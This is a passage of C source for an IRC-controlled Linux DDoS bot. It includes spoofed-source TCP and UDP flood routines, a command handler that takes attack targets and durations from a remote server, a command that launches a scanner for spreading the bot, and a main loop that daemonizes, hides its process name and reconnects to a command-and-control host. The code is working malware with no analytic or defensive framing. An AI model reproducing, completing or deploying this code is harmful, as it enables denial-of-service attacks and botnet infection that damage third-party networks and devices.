                        } else if(!strcmp(pch,  "fin"))
                        {
                                tcph->fin = 1;
                        } else if(!strcmp(pch,  "ack"))
                        {
                                tcph->ack = 1;
                        } else if(!strcmp(pch,  "psh"))
                        {
                                tcph->psh = 1;
                        } else {
                                sockprintf(mainCommSock, "Invalid flag \"%s\"", pch);
                        }
                        pch = strtok(NULL, ",");
                }
        }

        tcph->window = rand_cmwc();
        tcph->check = 0;
        tcph->urg_ptr = 0;
        tcph->dest = (port == 0 ? rand_cmwc() : htons(port));
        tcph->check = tcpcsum(iph, tcph);

        iph->check = csum ((unsigned short *) packet, iph->tot_len);

        int end = time(NULL) + timeEnd;
        register unsigned int i = 0;
        while(1)
        {
                sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

                iph->saddr = htonl( getRandomIP(netmask) );
                iph->id = rand_cmwc();
                tcph->seq = rand_cmwc();
                tcph->source = rand_cmwc();
                tcph->check = 0;
                tcph->check = tcpcsum(iph, tcph);
                iph->check = csum ((unsigned short *) packet, iph->tot_len);

                if(i == pollRegister)
                {
                        if(time(NULL) > end) break;
                        i = 0;
                        continue;
                }
                i++;
        }
}

void processCmd(int argc, unsigned char *argv[])
{
        if(!strcmp(argv[0], "PING"))
        {
               // sockprintf(mainCommSock, "PONG!");
                return;
        }

        if(!strcmp(argv[0], "GETLOCALIP"))
        {
                sockprintf(mainCommSock, "My IP: %s", inet_ntoa(ourIP));
                return;
        }

       if(!strcmp(argv[0], "LILBITCH"))
       {
        uint32_t parent;
		parent = fork();        
        int ii = 0;
        int forks = sysconf( _SC_NPROCESSORS_ONLN );
        int fds = 999999;
        if(forks == 1) fds = 500;
        if(forks >= 2) fds = 1000;
        if (parent > 0) { scanPid = parent; return;}
			      else if(parent == -1) return;
          for (ii = 0; ii < forks; ii++)
        {
               srand((time(NULL) ^ getpid()) + getppid());
                        init_rand(time(NULL) ^ getpid());
                        StartTheLelz(100, fds);
                        _exit(0);
                }
        }

        if(!strcmp(argv[0], "UDP"))
        {
                if(argc < 6 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || atoi(argv[4]) == -1 || atoi(argv[5]) == -1 || atoi(argv[5]) > 65500 || atoi(argv[4]) > 32 || (argc == 7 && atoi(argv[6]) < 1))
                {
                        //sockprintf(mainCommSock, "UDP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <packet size (1 to 65500)> (time poll interval, default 10)");
                        return;
                }

                unsigned char *ip = argv[1];
                int port = atoi(argv[2]);
                int time = atoi(argv[3]);
                int spoofed = atoi(argv[4]);
                int packetsize = atoi(argv[5]);
                int pollinterval = (argc == 7 ? atoi(argv[6]) : 10);

                if(strstr(ip, ",") != NULL)
                {
                        unsigned char *hi = strtok(ip, ",");
                        while(hi != NULL)
                        {
                                if(!listFork())
                                {
                                        sendUDP(hi, port, time, spoofed, packetsize, pollinterval);
                                        _exit(0);
                                }
                                hi = strtok(NULL, ",");
                        }
                } else {
                        if (listFork()) { return; }

                        sendUDP(ip, port, time, spoofed, packetsize, pollinterval);
                        _exit(0);
                }
        }

        if(!strcmp(argv[0], "TCP"))
        {
                if(argc < 6 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || atoi(argv[4]) == -1 || atoi(argv[4]) > 32 || (argc > 6 && atoi(argv[6]) < 0) || (argc == 8 && atoi(argv[7]) < 1))
                {
                        //sockprintf(mainCommSock, "TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)");
                        return;
                }

                unsigned char *ip = argv[1];
                int port = atoi(argv[2]);
                int time = atoi(argv[3]);
                int spoofed = atoi(argv[4]);
                unsigned char *flags = argv[5];

                int pollinterval = argc == 8 ? atoi(argv[7]) : 10;
                int psize = argc > 6 ? atoi(argv[6]) : 0;

                if(strstr(ip, ",") != NULL)
                {
                        unsigned char *hi = strtok(ip, ",");
                        while(hi != NULL)
                        {
                                if(!listFork())
                                {
                                        sendTCP(hi, port, time, spoofed, flags, psize, pollinterval);
                                        _exit(0);
                                }
                                hi = strtok(NULL, ",");
                        }
                } else {
                        if (listFork()) { return; }

                        sendTCP(ip, port, time, spoofed, flags, psize, pollinterval);
                        _exit(0);
                }
        }
        if(!strcmp(argv[0], "KILL"))
        {
                int killed = 0;
                unsigned long i;
                for (i = 0; i < numpids; i++) {
                        if (pids[i] != 0 && pids[i] != getpid()) {
                                kill(pids[i], 9);
                                killed++;
                        }
                }
                if(killed > 0)
                {
                       // sockprintf(mainCommSock, "Killed %d.", killed);
                } else {
                        //sockprintf(mainCommSock, "None Killed.");
                }
        }
        if(!strcmp(argv[0], "LUCKYLILDUDE"))
        {
                exit(0);
        }
}
int initConnection()
{
    unsigned char server[512];
	memset(server, 0, 512);
	if(mainCommSock) { close(mainCommSock); mainCommSock = 0; }
	if(currentServer + 1 == SERVER_LIST_SIZE) currentServer = 0;
	else currentServer++;

	strcpy(server, commServer[currentServer]);
	int port = 6667;
	if(strchr(server, ':') != NULL)
	{
		port = atoi(strchr(server, ':') + 1);
		*((unsigned char *)(strchr(server, ':'))) = 0x0;
	}
	mainCommSock = socket(AF_INET, SOCK_STREAM, 0);
	if(!connectTimeout(mainCommSock, server, port, 30)) return 1;
	return 0;
}

int main(int argc, unsigned char *argv[])
{
        char *mynameis = "";
        if(SERVER_LIST_SIZE <= 0) return 0;
        strncpy(argv[0],"",strlen(argv[0]));
        argv[0] = "";
        prctl(PR_SET_NAME, (unsigned long) mynameis, 0, 0, 0);
        srand(time(NULL) ^ getpid());
        init_rand(time(NULL) ^ getpid());
        pid_t pid1;
        pid_t pid2;
        int status;


        if (pid1 = fork()) {
                        waitpid(pid1, &status, 0);
                        exit(0);
        } else if (!pid1) {
                        if (pid2 = fork()) {
                                        exit(0);
                        } else if (!pid2) {
                        } else {
                        }
        } else {
  
        }

        setsid();
        chdir("/");

        signal(SIGPIPE, SIG_IGN);

        while(1)
        {
                if(initConnection()) { sleep(5); continue; }

                char commBuf[4096];
                int got = 0;
                int i = 0;
                while((got = recvLine(mainCommSock, commBuf, 4096)) != -1)
                {
                        for (i = 0; i < numpids; i++) if (waitpid(pids[i], NULL, WNOHANG) > 0) {
                                unsigned int *newpids, on;
                                for (on = i + 1; on < numpids; on++) pids[on-1] = pids[on];
                                pids[on - 1] = 0;
                                numpids--;
                                newpids = (unsigned int*)malloc((numpids + 1) * sizeof(unsigned int));
                                for (on = 0; on < numpids; on++) newpids[on] = pids[on];
                                free(pids);
                                pids = newpids;
                        }

                        commBuf[got] = 0x00;

                        trim(commBuf);

                        if(strstr(commBuf, "PING") == commBuf)
                        {
                                continue;
                        }

                        if(strstr(commBuf, "DUP") == commBuf) exit(0);

                        unsigned char *message = commBuf;

                        if(*message == '!')
                        {
                                unsigned char *nickMask = message + 1;
                                while(*nickMask != ' ' && *nickMask != 0x00) nickMask++;
                                if(*nickMask == 0x00) continue;
                                *(nickMask) = 0x00;
                                nickMask = message + 1;

                                message = message + strlen(nickMask) + 2;
                                while(message[strlen(message) - 1] == '\n' || message[strlen(message) - 1] == '\r') message[strlen(message) - 1] = 0x00;

                                unsigned char *command = message;
                                while(*message != ' ' && *message != 0x00) message++;
                                *message = 0x00;
                                message++;

                                unsigned char *tmpcommand = command;
                                while(*tmpcommand) { *tmpcommand = toupper(*tmpcommand); tmpcommand++; }

                                unsigned char *params[10];
                                int paramsCount = 1;
                                unsigned char *pch = strtok(message, " ");
                                params[0] = command;

                                while(pch)
                                {
                                        if(*pch != '\n')
                                        {
                                                params[paramsCount] = (unsigned char *)malloc(strlen(pch) + 1);
                                                memset(params[paramsCount], 0, strlen(pch) + 1);
                                                strcpy(params[paramsCount], pch);
                                                paramsCount++;
                                        }
                                        pch = strtok(NULL, " ");
                                }
                                processCmd(paramsCount, params);
                                if(paramsCount > 1)
                                {
                                        int q = 1;
                                        for(q = 1; q < paramsCount; q++)
                                        {
                                                free(params[q]);
                                        }
                                }
                        }
                }
        }
        return 0;
}